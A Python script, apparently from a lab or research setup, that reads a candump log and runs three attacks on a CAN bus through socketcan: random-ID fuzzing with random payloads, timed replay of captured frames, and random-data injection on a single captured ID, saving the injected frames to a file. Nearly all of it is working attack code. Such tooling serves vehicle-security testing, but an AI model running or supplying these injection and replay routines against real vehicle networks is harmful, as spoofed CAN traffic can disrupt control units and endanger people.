#!/usr/bin/env python
#Comando iniciar a CAN :   sudo ip link set can0 up type can bitrate 500000 loopback on
#comando pra salvar arquivo com timestamp candump can0 -t d &> testeLog.txt
from getch import getch
import time
import can
import random
can.rc['interface'] = 'socketcan'
can.rc['channel'] = 'can0'
can.rc['bitrate'] = 500000
from can.interface import Bus
msgToSend = []
extendIt = False
saveAttackString = []

def saveAttackInfo(msg):
    saveAttackString.append(msg)
def saveAttackOnFile():
    a = open("attack3Save.txt","w")
    for i in saveAttackString:
        a.write(str(i["id"]) + " " + str(i["msg"] )+ "\n")

    a.close()

def infoGet():
    f = open("testeLog.txt", "r")
    lines = f.readlines()
    linesReady = []
    
    for i in lines:
        linesReady.append(list(filter(lambda x: x!= "", i.split(" "))))
        linesReady[-1][-1] = linesReady[-1][-1].rstrip("\n")
    
    for i in linesReady:
        msgTime = float(i[0][1:-1])
        msgHeader = int(i[2], 16)
        msgBody = []
        if (len(i) > 5):
            for j in i[4:]:
                msgBody.append(int(j, 16))
        msgToSend.append((msgTime, msgHeader, msgBody))


def send_one(msg):
    """Sends a single message."""
    with can.Bus() as bus:
        bus = Bus()
        try:
            bus.send(msg)
            #print(f"Message sent on {bus.channel_info}")
        except can.CanError:
            print("Message NOT sent")

def attackOne(msgToSend):
    prev = time.time()
    stop = True
    while(stop):
        send_one(msg = can.Message(
            arbitration_id = msgToSend[random.randrange(0, len(msgToSend) - 1)][1], 
            data = [random.randint(0, 254), 
                    random.randint(0, 254), 
                    random.randint(0, 254), 
                    random.randint(0, 254), 
                    random.randint(0, 254), 
                    random.randint(0, 254), 
                    random.randint(0, 254), 
                    random.randint(0, 254)], 
            is_extended_id = extendIt)
        )
        actual = time.time()
        if((actual - prev) > 60.0):
            stop = False

def attackTwo(msgToSend):
    prev = time.time()
    stop = True
    while(stop):
        for i in range(0, 1000):
            msg = can.Message(
                arbitration_id = msgToSend[i][1], data = msgToSend[i][2], is_extended_id = extendIt
            )
            time.sleep(msgToSend[i + 1][0] * 0.98)
            send_one(msg)
        actual = time.time()
        if((actual - prev) > 60.0):
            stop = False

def attackThree(msgToSend):
    prev = time.time()
    stop = True

    while(stop):
        for i in range(0, 200):
            msgLen = len(msgToSend[0][2])
            dataToSend = []
            for j in range(msgLen):
                dataToSend.append(random.randint(0, 254))
            #print(dataToSend)
            msg = can.Message(
                arbitration_id = msgToSend[0][1], data = dataToSend, is_extended_id = extendIt
            )   
            time.sleep(msgToSend[i+1][0] * 0.98)
            send_one(msg)
            saveAttackInfo({"id": msgToSend[0][1], "msg": dataToSend})

        actual = time.time()
        if((actual - prev) > 60.0):
            stop = False
    saveAttackOnFile()

if __name__ == "__main__":
    infoGet()
    while True:
        print("Press '1' to test 1")
        print("Press '2' to test 2")
        print("Press '3' to test 3")
        print("\nPress 's' to send a message to CAN BUS or press 'q' to Quit\n")
        pressedKey = getch()
        if pressedKey == 's':
            send_one(msg = can.Message(
                arbitration_id = msgToSend[random.randrange(0, len(msgToSend) - 1)][1], 
                data = [random.randint(0, 254), 
                        random.randint(0, 254), 
                        random.randint(0, 254), 
                        random.randint(0, 254), 
                        random.randint(0, 254), 
                        random.randint(0, 254), 
                        random.randint(0, 254), 
                        random.randint(0, 254)], 
                is_extended_id = extendIt)
            )
        elif pressedKey == '1': 
            attackOne(msgToSend)
        elif pressedKey == '2':
            attackTwo(msgToSend)
        elif pressedKey == '3':
            attackThree(msgToSend)     
        elif pressedKey == 'q':    
            systems.exit()
        else:
            print ("\nKey Pressed:" + str(pressedKey))
    